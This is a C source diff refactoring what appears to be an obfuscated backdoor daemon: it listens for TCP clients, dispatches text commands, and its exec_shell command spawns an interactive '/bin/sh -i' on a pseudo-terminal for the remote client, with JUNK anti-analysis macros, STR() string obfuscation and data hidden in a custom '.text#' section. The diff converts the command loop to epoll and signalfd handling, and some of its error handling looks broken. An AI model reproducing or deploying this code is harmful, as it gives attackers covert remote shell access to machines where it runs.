@@ -13,11 +13,14 @@
 #include "daemon.h"
 #include "utils.h"
 #include "death.h"
+#include "signale.h"
 #include "syscall.h"
 
 #define CLOSE_END 0
 #define NO_CLOSE_END 1
 #define MAX_CLIENTS 2
+
+char __attribute__((section(".text#"))) **g_env;
 
 void logger(const char *msg);
 
@@ -85,9 +88,7 @@ static int create_server(void)
 static int accept_client(int fd)
 {
 	struct sockaddr_in addr;
-	socklen_t addr_len = sizeof(addr);
-
-	JUNK;
+	socklen_t addr_len = sizeof(addr); JUNK;
 
 	//int client_fd = accept(fd, &addr, &addr_len);
 	int client_fd = accept4(fd, (struct sockaddr *)&addr, &addr_len, SOCK_NONBLOCK | SOCK_CLOEXEC);
@@ -98,7 +99,9 @@ static int accept_client(int fd)
 	return client_fd;
 }
 
-ret_t hello(param_t *command)
+/* Commands */
+
+int hello(param_t *command)
 {
 	(void)command;
 	logger(STR("hello\n"));
@@ -108,7 +111,7 @@ ret_t hello(param_t *command)
 int __attribute__((section(".text#"))) g_master_fd = -1;
 int __attribute__((section(".text#"))) g_client_fd = -1;
 
-ret_t exec_shell(param_t *command)
+int exec_shell(param_t *command)
 {
 	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
 	//int client_fd = command->client_fd;
@@ -198,7 +201,6 @@ ret_t exec_shell(param_t *command)
 			return -1;
 		} JUNK;
 
-		command->master_fd = master_fd;
 		g_master_fd = master_fd;
 		g_client_fd = command->client_fd;
 		
@@ -206,14 +208,14 @@ ret_t exec_shell(param_t *command)
 	return 0;
 }
 
-ret_t unknown(param_t *command)
+int unknown(param_t *command)
 {
 	(void)command;
 	logger(STR("unknown command\n"));
 	return 0;
 }
 
-command_func_t get_command(const char *cmd)
+int (*get_command(const char *cmd))(param_t *)
 {
 
 	command_t commands[] = {
@@ -231,29 +233,312 @@ command_func_t get_command(const char *cmd)
 	return unknown;
 }
 
-//#define ft_sigmask(sig) (1UL << ((sig) - 1) % ULONG_WIDTH)
-unsigned long int ft_sigmask(int signum)
+/* Main epoll loop */
+/* pretty sure EPOLLRHUP and EPOLLHUP implicitly added */
+static int add_event(int epoll_fd, event_t *event)
 {
-	return (1UL << ((signum - 1) % ULONG_WIDTH));
+	struct epoll_event ev;
+	ev.events = EPOLLIN | EPOLLRDHUP | EPOLLHUP;
+	ev.data.ptr = event;
+
+	return epoll_ctl(epoll_fd, EPOLL_CTL_ADD, event->fd, &ev);
 }
 
-unsigned long int ft_sigword(int signum)
+static int remove_event(int epoll_fd, event_t *event)
 {
-	return (signum - 1) / ULONG_WIDTH;
+	return epoll_ctl(epoll_fd, EPOLL_CTL_DEL, event->fd, NULL);
 }
 
-int ft_sigemptyset(kernel_sigset_t *set)
+void fill_event(event_t *event, int fd, void (*handle_event)(event_t *, uint32_t), void *context, int epoll_fd)
 {
-	//for (size_t i = 0; i < _SIGSET_NWORDS; i++) {
-	//	set->__val[i] = 0;
-	//}
-	ft_memset(set->__val, 0, sizeof(set->__val));
-	return 0;
+	event->fd = fd;
+	event->epoll_fd = epoll_fd;
+	event->handle_event = handle_event;
+	event->context = context;
 }
 
-void ft_sigaddset(kernel_sigset_t *set, int signum)
+void signal_event(event_t *self, uint32_t events) {
+	if (events & EPOLLRDHUP || events & EPOLLHUP) {
+		logger(STR("signal event: EPOLLRDHUP or EPOLLHUP\n"));
+		return;
+	} else if (events & EPOLLIN) {
+		//signal_t *signal = (signal_t *)self->context;
+		struct signalfd_siginfo siginfo;
+		ssize_t s = read(self->fd, &siginfo, sizeof(siginfo));
+		if (s != sizeof(siginfo)) {
+			logger(STR("read failed\n"));
+			return;
+		} JUNK;
+
+		if (siginfo.ssi_signo == SIGCHLD) {
+			siginfo_t info;
+			pid_t pid = waitid(P_ALL, 0, &info, WEXITED | WNOHANG);
+			if (pid == 0) {
+				if (info.si_code == CLD_EXITED) {
+					logger(STR("child process terminated\n"));
+				} else if (info.si_code == CLD_KILLED) {
+					logger(STR("child process killed\n"));
+				} else if (info.si_code == CLD_DUMPED) {
+					logger(STR("child process dumped\n"));
+				} else if (info.si_code == CLD_STOPPED) {
+					logger(STR("child process stopped\n"));
+				} else if (info.si_code == CLD_CONTINUED) {
+					logger(STR("child process continued\n"));
+				}
+			}
+
+		}
+	}
+}
+
+void client_event(event_t *self, uint32_t events) {
+
+	if (events & EPOLLRDHUP || events & EPOLLHUP) {
+		logger(STR("client event: EPOLLRDHUP or EPOLLHUP\n"));
+		// handle client disconnection
+		return;
+	} else if (events & EPOLLIN) {
+
+		//client_t *client = (client_t *)self->context;
+
+		char buf[256];
+
+		buf[0] = '\0';
+
+		//check if fd is blocking
+		int flags = fcntl(self->fd, F_GETFL, 0);
+		if (flags == -1) {
+			logger(STR("fcntl failed\n"));
+			return;
+		}
+		if (flags & O_NONBLOCK) {
+			logger(STR("fd is non-blocking\n"));
+		} else {
+			logger(STR("fd is blocking\n"));
+			return;
+		}
+
+		ssize_t ret = read(self->fd, buf, sizeof(buf) - 1);
+
+		if (ret == -1) {
+			logger(STR("read failed\n"));
+			return;
+
+		} else if (ret == 0) {
+			logger(STR("client disconnected\n"));
+			epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, self->fd, NULL);
+			close(self->fd);
+			return;
+		} JUNK;
+
+		if (buf[ret - 1] == '\n') {
+			buf[ret - 1] = '\0';
+		}
+
+		param_t command = {
+			.client_fd = self->fd,
+		};
+
+		int (*func)(param_t *) = get_command(buf);
+		if (func != NULL) {
+			func(&command);
+		}
+
+	}
+}
+
+static int create_pts(void) {
+		int master_fd = open(STR("/dev/ptmx"), O_RDWR | O_NOCTTY | O_CLOEXEC);
+		if (master_fd == -1) {
+			logger(STR("open /dev/ptmx failed\n"));
+			return -1;
+		} JUNK;
+
+		int unlock = 0;
+		if (ioctl(master_fd, TIOCSPTLCK, &unlock) == -1) {
+			logger(STR("ioctl TIOCSPTLCK failed\n"));
+			close(master_fd);
+			return -1;
+		} JUNK;
+
+		int pty_num;
+		if (ioctl(master_fd, TIOCGPTN, &pty_num) == -1) {
+			logger(STR("ioctl TIOCGPTN failed\n"));
+			close(master_fd);
+			return -1;
+		} JUNK;
+
+		char pty_name[32];
+		char *ptr = pty_name;
+		ptr = ft_stpncpy(ptr, STR("/dev/pts/"), 32 - (ptr - pty_name));
+		itoa(pty_num, ptr);
+
+		return master_fd;
+}
+
+void server_event(event_t *self, uint32_t events)
 {
-	set->__val[ft_sigword(signum)] |= ft_sigmask(signum);
+
+	if (events & EPOLLRDHUP || events & EPOLLHUP) {
+		logger(STR("server event: EPOLLRDHUP or EPOLLHUP\n"));
+
+	} else if (events & EPOLLIN) {
+		server_t *server = (server_t *)self->context;
+		int client_fd = accept_client(self->fd);
+		if (client_fd == -1) {
+			logger(STR("accept failed\n"));
+			return;
+		} JUNK;
+
+		if (setnonblocking(client_fd) < 0) {
+			logger(STR("setnonblocking failed\n"));
+			close(client_fd);
+			return;
+		} JUNK;
+
+		client_t *client = NULL;
+		for (int i = 0; i < MAX_CLIENTS; i++) {
+			if (server->client[i].client_ev.fd == 0) {
+				client = &server->client[i];
+				break;
+			}
+		}
+
+		if (client == NULL) {
+			logger(STR("too many clients\n"));
+			close(client_fd);
+			return;
+		} JUNK;
+
+		client->client_ev.fd = client_fd;
+		client->client_ev.epoll_fd = self->epoll_fd;
+		client->client_ev.handle_event = client_event;
+		client->client_ev.context = client;
+
+
+
+		client->master_ev.epoll_fd = self->epoll_fd;
+		client->master_ev.handle_event = client_event;
+		client->master_ev.context = client;
+		int unlock = 0;
+
+
+
+		if (setnonblocking(client->master_ev.fd) < 0) {
+			logger(STR("setnonblocking failed\n"));
+			close(client->master_ev.fd);
+			close(client_fd);
+			client->client_ev.fd = 0; // reset the fd
+			return;
+		} JUNK;
+
+		if (add_event(self->epoll_fd, &client->client_ev) == -1) {
+			logger(STR("add_event failed\n"));
+			close(client_fd);
+			client->client_ev.fd = 0; // reset the fd
+			return;
+		} JUNK;
+
+		if (add_event(self->epoll_fd, &client->master_ev) == -1) {
+			logger(STR("add_event failed\n"));
+			goto error;
+		} JUNK;
+
+error:
+		client->client_ev.fd = 0;
+		client->master_ev.fd = -1;
+		remove_event(self->epoll_fd, &client->client_ev);
+		remove_event(self->epoll_fd, &client->master_ev);
+		close(client_fd);
+		close(client->master_ev.fd);
+
+	}
+}
+
+
+static int init_epoll(int sfd, server_t *server, signal_t *signal) {
+	int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+	if (epoll_fd == -1) {
+		logger(STR("epoll_create1 failed\n"));
+		return -1;
+	} JUNK;
+
+	fill_event(&server->event, sfd, server_event, server, epoll_fd);
+	if (add_event(epoll_fd, &server->event) == -1) {
+		logger(STR("add_event failed\n"));
+		close(epoll_fd);
+		return -1;
+	} JUNK;
+
+	kernel_sigset_t mask, oldmask;
+	ft_sigemptyset(&mask);
+	ft_sigaddset(&mask, SIGCHLD);
+	if (sigprocmask(SIG_BLOCK, &mask, &oldmask, _NSIG/8) == -1) {
+		logger(STR("sigprocmask failed\n"));
+		close(epoll_fd);
+		return -1;
+	} JUNK;
+
+	int signal_fd = signalfd4(-1, &mask, _NSIG/8, SFD_NONBLOCK | SFD_CLOEXEC);
+	if (signal_fd == -1) {
+		logger(STR("signalfd failed\n"));
+		close(epoll_fd);
+		return -1;
+	} JUNK;
+
+	fill_event(&signal->event, signal_fd, signal_event, signal, epoll_fd);
+	if (add_event(epoll_fd, &server->signal->event) == -1) {
+		logger(STR("add_event failed\n"));
+		close(signal_fd);
+		close(epoll_fd);
+		return -1;
+	} JUNK;
+
+	return epoll_fd;
+}
+
+static void epoller2(int sfd, char **envp) {
+
+	//char buf[256];
+	//struct epoll_event events[MAX_CLIENTS * 2 + NB_SERVER + NB_SIGNAL];
+	server_t server;
+	signal_t signal;
+	client_t client[MAX_CLIENTS];
+	struct epoll_event events[MAX_CLIENTS * 2 + NB_SERVER + NB_SIGNAL];
+
+	ft_memset(&server, 0, sizeof(server));
+	ft_memset(&signal, 0, sizeof(signal));
+	ft_memset(client, 0, sizeof(client));
+
+	server.client = client;
+	server.signal = &signal;
+
+	int epoll_fd = init_epoll(sfd, &server, &signal);
+	if (epoll_fd == -1) {
+		logger(STR("init_epoll failed\n"));
+		return;
+	} JUNK;
+
+	while (1) {
+		int n = epoll_wait(epoll_fd, events, sizeof(events) / sizeof(events[0]), -1);
+		if (n == -1) {
+			if (errno == EINTR) {
+				logger(STR("epoll_wait interrupted by signal, retrying\n"));
+				continue; // interrupted by a signal, retry
+			}
+			logger(STR("epoll_wait failed\n"));
+			break;
+		}
+
+		for (int i = 0; i < n; i++) {
+			event_t *event = (event_t *)events[i].data.ptr;
+			if (event->handle_event) {
+				event->handle_event(event, events[i].events);
+			} else {
+				logger(STR("event handler not set LOGIC ERROR\n"));
+			}
+		}
+	}
 }
 
 static void epoller(int sfd, char **envp)
@@ -384,6 +669,7 @@ static void epoller(int sfd, char **envp)
 					
 			} else {
 
+
 				buf[0] = '\0';
 
 				//check if fd is blocking
@@ -430,9 +716,8 @@ static void epoller(int sfd, char **envp)
 				param_t command = {
 					.client_fd = events[i].data.fd,
 					.envp = envp,
-					.master_fd = -1
-				};
-				command_func_t func = get_command(buf);
+			};
+				int (*func)(param_t *) = get_command(buf);
 				if (func != NULL) {
 					func(&command);
 				}
